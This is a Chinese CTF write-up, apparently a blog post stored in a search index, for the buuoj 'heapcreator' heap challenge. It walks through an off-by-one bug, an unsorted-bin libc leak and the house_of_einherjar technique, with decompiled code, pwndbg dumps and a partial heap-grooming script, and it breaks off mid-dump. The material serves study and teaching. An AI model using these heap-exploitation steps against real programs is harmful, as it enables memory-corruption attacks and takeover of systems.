<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buuoj_heapcreator</title>
    <url>/2022/03/20/buuoj-heapcreator/</url>
    <content><![CDATA[<h2 id="这次刷题记录开始着重整理下在Glibc-2-23下的一些利用姿势"><a href="#这次刷题记录开始着重整理下在Glibc-2-23下的一些利用姿势" class="headerlink" title="这次刷题记录开始着重整理下在Glibc-2.23下的一些利用姿势"></a>这次刷题记录开始着重整理下在Glibc-2.23下的一些利用姿势</h2><p>说明下buuoj的一些不好的地方，buuoj基本不会给libc,而有些没有后门的程序，往往需要去泄露libc的基地址，但是最近的一些题目很孬去匹配到正确的版本，我也就不清楚是什么问题了。这里就不过多赘述了，而匹配libc就不作为本文的一个要点。我们只要在本地同通过测试就好了</p>
<h2 id="浅析"><a href="#浅析" class="headerlink" title="浅析"></a>浅析</h2><p>题目环境以及保护<br>ubuntu16</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ checksec --file=heapcreator</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/buuoj/heapcreater/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">$ file heapcreator </span><br><span class="line">heapcreator: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">5e69111</span>eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>程序呢并没有开启full relro,这里就首先反映到是不是可以修改函数的got表呢？根据题目描述，其实就已经断定了这是一个堆题。</p>
<p>接下来我们就主要看看其逻辑思路了</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典的分支结构</p>
<h3 id="MENU"><a href="#MENU" class="headerlink" title="MENU"></a>MENU</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Creat"><a href="#Creat" class="headerlink" title="Creat"></a>Creat</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  trr *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;heaparray + i) = (trr *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = *(&amp;heaparray + i);</span><br><span class="line">      v0-&gt;ptr = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(*(&amp;heaparray + i))-&gt;ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      (*(&amp;heaparray + i))-&gt;size = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input((*(&amp;heaparray + i))-&gt;ptr, size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">read_input</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看creat的时候，首先可以看看是否存在溢出的可能。但是这道题这里没有什么溢出的可能。但是可以修改堆块的prev_size</p>
<h3 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input((<span class="type">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr, (*(&amp;heaparray + v1))-&gt;size + <span class="string">&#x27;\x01&#x27;</span>);<span class="comment">// 1字节溢出</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是当我们看到edit函数的时候，但到了这里有一个非常显眼的1字节溢出，所以后续考虑OFF_BY_ONE攻击手法与其他手法配合使用</p>
<h3 id="Show"><a href="#Show" class="headerlink" title="Show"></a>Show</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, (*(&amp;heaparray + v1))-&gt;size, (<span class="type">const</span> <span class="type">char</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br></pre></td></tr></table></figure>

<p>show这里也没有什么特殊的，</p>
<h3 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;                   <span class="comment">// 只清空了heaparray,结构体中指针未清空，</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free模块这里，其实仔细看，会发现虽然free后将bss段上的指针清空了，但是结构体的ptr成员并没有清空，但是这了uaf并不是很容易利用。因为bss段上的指针被清空了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trr</span>&#123;</span></span><br><span class="line">	<span class="type">size_t</span> size; 		<span class="comment">//记录大小</span></span><br><span class="line">	<span class="type">void</span> * ptr;			<span class="comment">//储存我们输入Content</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ss:<span class="number">00000000006020</span>A0 ; trr *heaparray</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0 heaparray       dq ?                    ; DATA XREF: create_heap+<span class="number">31</span>↑r</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0                                         ; create_heap+<span class="number">54</span>↑w ...</span><br><span class="line">.bss:<span class="number">00000000006020</span>A8                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>A9                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AA                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AB                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AC                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AD                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AE                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AF                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>0                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>1                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>2                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>3                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>4                 db    ? ;</span><br></pre></td></tr></table></figure>

<p>题目大概就是这样，初步我们看到了一个off_by_one漏洞，以及一个不是很理想UAF</p>
<h2 id="pwning"><a href="#pwning" class="headerlink" title="pwning"></a>pwning</h2><h3 id="开始前的准备"><a href="#开始前的准备" class="headerlink" title="开始前的准备"></a>开始前的准备</h3><p>首先这个题并没有后门，那么我们就要去泄露libc的基地址。然后再去考虑其他的</p>
<h3 id="leak-the-libc-base"><a href="#leak-the-libc-base" class="headerlink" title="leak the libc_base"></a>leak the libc_base</h3><p>这里我们关注到的是在申请到堆块之后，并没有对其进行初始化，只是对储存有content的堆块检查读入的数据是否为0字节，也就是说我们至少读入一个字节，不过因为使用的read函数，所以不会自动的添加换行符，但这无所谓，这里将一个比较常用的unsortedbins泄露基地址main_arena.当一个较大的chunk超过了fastbins的范围，就会被加入unsortedbins双链表中。其实，第一个堆块的fd,bk指针会指向main_arena+x,。当我们再次申请到这个chunk时，其fd,bk指针不会被清空，只是会被我们输入的content覆盖。但是我们输入的content只检查了至少输入一个字节，而且允许我们输入’\x00’空字符。</p>
<p>那么这里就有了完整的泄露的思路</p>
<p>申请一个0x80的堆块（实际得到的0x90）,然后将其释放。因为这个是一个嵌套的堆块，delete的时候先释放content,再释放struct</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x2368000</span>			<span class="comment">//struct_trr</span></span><br><span class="line"><span class="number">0x2368000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x2368010</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000002368030</span></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x2368020</span>			<span class="comment">//content</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>free后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x2368000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x2368020</span> —▸ <span class="number">0x7fb1f48beb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x2368020</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"></span><br><span class="line">##########################################################<span class="meta">#    </span></span><br><span class="line"><span class="meta">pwndbg&gt; x/4gx 0x2368020</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x00007fb1f48beb78</span>	<span class="number">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>

<p>重新申请后，只要控制conten的长度不会将bk指针释放释放，同时字符串可以将bk链接起来，就可以再show的时候，将bk泄露出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x2368010</span></span><br><span class="line"><span class="number">0x2368010</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000002368030</span></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x0000000002368030</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>

<h3 id="关键point"><a href="#关键point" class="headerlink" title="关键point"></a>关键point</h3><p>这个题的关键难点在于适合实现shell，劫持malloc_hook也好，覆盖got表也好都需要实现任意地址写，这里我们用到一个unlink手法house_of_einherjar。这项技术使用的前提就是存在溢出，至少1字节，来修改一个allocated_chunk的prev_size和prev_inuse。</p>
<blockquote>
<p>house_of_einherjar&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;<br>    而此手法有几个点值得关注，1，我们可以认为的修改一个allocted_chunk的prev_size,以及prev_inuse.我们需要构造一个fake_chunk(一个方面泄露栈地址，在栈上伪造一个chunk，这个方法配合修改eip使用，但是因为栈的内容会发生变化，就要进一步思考控制具体到哪里。其二可以在bss段上伪造chunk，达到修改全局变量的目的。其三可以控制到got表，修改got表。其四控制到malloc_hook,free_hook,reallok_hook,使用onegadget)。 prev_size &#x3D; victim_chunk_size - aimed_address。 同时我们还需要利用victim的前一个allocted chunk A， 申请的大小不要使16位对齐，0x10*k+8,这样就可以在申请到victim B后，prev_size允许被A使用，同时可以利用off_by_one技术NULL溢出修改B的prev_inuse（将其改为0），这样unlink通过chunk_addr_B - prev_size 定位到fake_chunk,因为bss以及栈地址通常会比heap地址大，所以prev_size传入的是一个负数，但是因为prev_size是无符号数，发生溢出，就这样虽然我们free B，向前unlink，结果其实把后面的fakechunk合并到一起，而且新的堆头地址是fakechunk。注意构造fake_chunk时,要保证其可以pass unlink的检查 </p>
<p>p-&gt;fd-&gt;bk&#x3D;p,p-&gt;bk-&gt;fd&#x3D;p,p-&gt;prev_size &#x3D; p-&gt;bk-&gt;size，p-&gt;fd-&gt;prev_size &#x3D; p-&gt;size,最简单的就是将fd、bk指向自己。unlink时，不会改变被合并的堆块的数据，只会更改新的堆头数据,此时fakechunk就是新的topchunk</p>
</blockquote>
<p>我们在对快中伪造一个个fakechunk，然后修改victim_chunk,这里要注意的是，victim_chunk必须与topchunk相邻，才可以实现fake_top_chunk.这里细解释下为什么这样做，这样做的目的是，在unlink前，我们已经申请出一些堆块，比如存在一个结构体堆块，而这个堆块的地址比fakechunk大，那么unlink后，这个堆块的数据不变，但是topchunk的位置在这个堆块之前，我们就可以再次利用到这个堆块，换言之，我们申请一个很大堆块，那么刚刚所说 结构体会被包含，当我们编辑这个大堆块的内容时，控制长度就可以将其覆盖，而我们有知道结构体里面还有一个content的指针，如果我们把这个覆盖这个指针，就实现了任意地址写。</p>
<p>这里要解决几个问题，每次创建的时候会申请出来两个堆块，一个大小0x20,一个为size。为了溢出，我们就要考虑堆块的布局，这里我提供一种</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)		<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)		<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)		<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;ssss&#x27;</span>)		<span class="comment">#3</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>0用来leak libc_base,我们重复利用，1我们构造了两个大小相等的堆块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x21</span>:struct0---&gt; struct1 ---&gt;content1 ---&gt;struct2 ---&gt;struct3 ---&gt;<span class="number">0</span></span><br><span class="line"><span class="number">0x61</span>:conten2 ---&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">unsortedbins: content0 ---&gt;content3 ---&gt;main_arena			<span class="comment">//(FIFO)</span></span><br><span class="line">    </span><br><span class="line"> fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x2368000</span> —▸ <span class="number">0x23680b0</span> —▸ <span class="number">0x23680d0</span> —▸ <span class="number">0x23680f0</span> —▸ <span class="number">0x2368170</span> ◂— ...</span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x2368110</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x2368020</span> —▸ <span class="number">0x7fb1f48beb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x2368020</span></span><br></pre></td></tr></table></figure>

<p>在重新申请堆块的过程中我们还要完成堆地址的泄露，这里其实有两个选择，一种是将struct申请作为content，因为free的时候，struct.ptr没有被清空，可以被泄露。另外一种就是不考虑时那种堆块，只要不是fastbin的最后一个，申请出来时，fd指针没有被清空，此时我们输入的content只要时其最低字节就可以（heap的地址最低三字节一定是0x000，通过计算 可以得到对低字节）。content3与topchunk相邻，释放后会与其合并，我们不需要考虑，因为unsortedbin里只有0x90的content0，只要申请的堆块比他大，就会从topchunk获取，因为0x21大小的堆块在fastbin里面有好几个，就可以是的从topchunk连续获得两个较大的堆块，这样edit前面堆块就可以完成溢出，fake chunk的构造需要一定的空间，所以我们使用了0x50的堆块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fakechunk:<span class="number">0x2368120</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>gx <span class="number">0x0000000002368120</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x2368110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x2368120</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000110</span><span class="comment">//fakesize = victim_prev_size</span></span><br><span class="line"><span class="number">0x2368130</span>:	<span class="number">0x0000000002368120</span>	<span class="number">0x0000000002368120</span><span class="comment">//为了方便绕过检查，fd,bk直接指向fakechunk</span></span><br><span class="line"><span class="number">0x2368140</span>:	<span class="number">0x0000000002368120</span>	<span class="number">0x0000000002368120</span></span><br><span class="line"><span class="number">0x2368150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> fake_size = fake_prev_size = victimchunk-fakechunk</span><br><span class="line"> pwndbg&gt; x/<span class="number">18</span>gx <span class="number">0x00000000023681a0</span><span class="number">-0x10</span>		<span class="comment">//victimchunk</span></span><br><span class="line"><span class="number">0x2368190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x23681a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368200</span>:	<span 